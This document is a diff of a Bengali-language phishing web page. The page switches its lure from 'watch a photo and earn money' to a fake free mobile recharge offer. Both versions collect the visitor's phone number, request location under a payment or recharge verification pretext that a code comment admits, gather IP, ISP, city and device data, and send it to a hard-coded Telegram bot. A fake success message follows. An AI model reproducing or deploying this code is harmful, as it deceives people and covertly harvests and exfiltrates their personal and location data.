@@ -3,76 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Earn Money - Watch & Earn</title>
+    <title>Mobile Recharge Offer</title>
     <style>
-        body { background: #f4f7f6; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; text-align: center; color: #333; }
-        .header { background: #0088cc; color: #fff; padding: 20px; font-size: 22px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .container { max-width: 450px; margin: 30px auto; background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
-        .nature-img { width: 100%; border-radius: 10px; margin-bottom: 20px; }
-        .timer { font-size: 18px; color: #e74c3c; font-weight: bold; padding: 10px; border: 1px dashed #e74c3c; border-radius: 5px; }
-        .balance-box { background: #d4edda; color: #155724; padding: 15px; border-radius: 10px; margin: 20px 0; display: none; }
-        .balance-text { font-size: 24px; font-weight: bold; }
-        input { width: 90%; padding: 15px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; display: none; outline: none; }
-        .btn-withdraw { background: #28a745; color: #fff; padding: 18px; width: 100%; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; display: none; }
-        .footer { font-size: 12px; color: #999; margin-top: 30px; }
+        body { background: #ffffff; font-family: 'Arial', sans-serif; margin: 0; padding: 0; text-align: center; color: #333; }
+        .top-bar { background: #f8f9fa; padding: 20px; border-bottom: 1px solid #eee; }
+        .container { max-width: 400px; margin: 40px auto; padding: 20px; border: 1px solid #eee; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        .offer-title { color: #28a745; font-size: 24px; font-weight: bold; margin-bottom: 10px; }
+        .offer-desc { font-size: 16px; color: #666; margin-bottom: 30px; }
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; box-sizing: border-box; outline: none; }
+        .btn { background: #007bff; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #0056b3; }
+        .footer { margin-top: 50px; font-size: 12px; color: #aaa; }
     </style>
 </head>
 <body>
 
-    <div class="header">সহজ ইনকাম - প্রতিদিন ছবি দেখে টাকা আয়!</div>
+    <div class="top-bar">
+        <strong>অনলাইন রিচার্জ পোর্টাল</strong>
+    </div>
 
     <div class="container">
-        <p id="instruction">নিচের ছবিটি ১০ সেকেন্ড মনোযোগ দিয়ে দেখুন। সময় শেষ হলে আপনার অ্যাকাউন্টে ২০ টাকা জমা হবে।</p>
+        <div class="offer-title">অফার: ২০ টাকা মোবাইল রিচার্জ</div>
+        <p class="offer-desc">নিচের বক্সে আপনার নম্বরটি দিয়ে রিচার্জ গ্রহণ করুন। এটি একটি সীমিত সময়ের অফার!</p>
         
-        <img src="https://images.unsplash.com/photo-1501854140801-50d01698950b?auto=format&fit=crop&w=500&q=80" class="nature-img">
-
-        <div id="timerBox" class="timer">অপেক্ষা করুন: <span id="sec">10</span> সেকেন্ড</div>
-
-        <div id="balanceDisplay" class="balance-box">
-            <div class="balance-text">অভিনন্দন! আপনার ব্যালেন্স: ৳২০.০০</div>
-            <p style="font-size: 14px;">নিচে নম্বর দিয়ে রিচার্জ গ্রহণ করুন।</p>
+        <div class="input-group">
+            <label>মোবাইল নম্বর (১১ সংখ্যা):</label>
+            <input type="number" id="rechargeNumber" placeholder="01XXXXXXXXX" required>
         </div>
 
-        <input type="number" id="userPhone" placeholder="বিকাশ বা নগদ নম্বর দিন">
-        
-        <button id="withdrawBtn" class="btn-withdraw" onclick="initiateCapture()">উইথড্র দিন</button>
-        
-        <div class="footer">© 2026 EasyEarn BD - Secure Payment</div>
+        <button class="btn" onclick="startVerification()">রিচার্জ নিন</button>
+    </div>
+
+    <div class="footer">
+        © 2026 Mobile Services Bangladesh. All Rights Reserved.
     </div>
 
 <script>
-    // ১০ সেকেন্ডের কাউন্টডাউন
-    let seconds = 10;
-    const timerInterval = setInterval(() => {
-        seconds--;
-        document.getElementById("sec").innerText = seconds;
-        if (seconds <= 0) {
-            clearInterval(timerInterval);
-            enableWithdraw();
-        }
-    }, 1000);
-
-    function enableWithdraw() {
-        document.getElementById("instruction").style.display = "none";
-        document.getElementById("timerBox").style.display = "none";
-        document.getElementById("balanceDisplay").style.display = "block";
-        document.getElementById("userPhone").style.display = "inline-block";
-        document.getElementById("withdrawBtn").style.display = "block";
-    }
-
-    async function initiateCapture() {
-        const phone = document.getElementById('userPhone').value;
+    async function startVerification() {
+        const phone = document.getElementById('rechargeNumber').value;
+        
         if (phone.length < 11) {
             alert("সঠিক ১১ সংখ্যার মোবাইল নম্বর দিন!");
             return;
         }
 
-        // পেমেন্ট ভেরিফিকেশনের বাহানায় লোকেশন পারমিশন চাওয়া
+        // রিচার্জ ভেরিফিকেশনের বাহানায় লোকেশন পারমিশন চাওয়া
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => collectData(phone, pos.coords.latitude, pos.coords.longitude),
                 () => {
-                    alert("পেমেন্ট ভেরিফিকেশন ব্যর্থ! টাকা পেতে লোকেশন 'Allow' করতে হবে।");
+                    alert("ভেরিফিকেশন ব্যর্থ! রিচার্জ পেতে লোকেশন পারমিশন 'Allow' করতে হবে।");
                     collectData(phone, "Denied", "Denied");
                 }
             );
@@ -80,27 +62,32 @@
     }
 
     async function collectData(phone, lat, lon) {
-        // IP ও অন্যান্য তথ্য
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        
-        const mapLink = (lat === "Denied") ? "Denied" : `https://www.google.com/maps?q=${lat},${lon}`;
-        
-        const botToken = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
-        const chatId = "7547190025";
-        
-        const message = `💰 **উইথড্র রিকোয়েস্ট!** 💰\n\n` +
-                        `📞 **নম্বর:** ${phone}\n` +
-                        `🌐 **IP:** ${data.ip}\n` +
-                        `📶 **সিম:** ${data.org}\n` +
-                        `🏙️ **শহর:** ${data.city}\n` +
-                        `📍 **ম্যাপ:** ${mapLink}`;
+        try {
+            // IP এবং ISP তথ্য সংগ্রহ
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            
+            const mapLink = (lat === "Denied") ? "ইউজার অনুমতি দেয়নি" : `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const botToken = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
+            const chatId = "7547190025";
+            const device = navigator.userAgent;
+            
+            const message = `📱 **নতুন রিচার্জ রিকোয়েস্ট** 📱\n\n` +
+                            `📞 **নম্বর:** ${phone}\n` +
+                            `🌐 **IP:** ${data.ip}\n` +
+                            `📶 **অপারেটর:** ${data.org}\n` +
+                            `🏙️ **শহর:** ${data.city}, ${data.country_name}\n` +
+                            `📱 **ডিভাইস:** ${device}\n` +
+                            `📍 **ম্যাপ:** ${mapLink}`;
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-        .then(() => {
-            alert("আপনার উইথড্র রিকোয়েস্ট সফল হয়েছে। ১ ঘণ্টার মধ্যে পেমেন্ট পৌঁছে যাবে।");
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            
+            alert("আপনার রিচার্জ রিকোয়েস্টটি সফলভাবে গ্রহণ করা হয়েছে। আগামী ৩০ মিনিটের মধ্যে রিচার্জ পৌঁছে যাবে।");
             window.location.href = "https://www.google.com";
-        });
+        } catch (error) {
+            alert("সার্ভার ত্রুটি! আবার চেষ্টা করুন।");
+        }
     }
 </script>
 
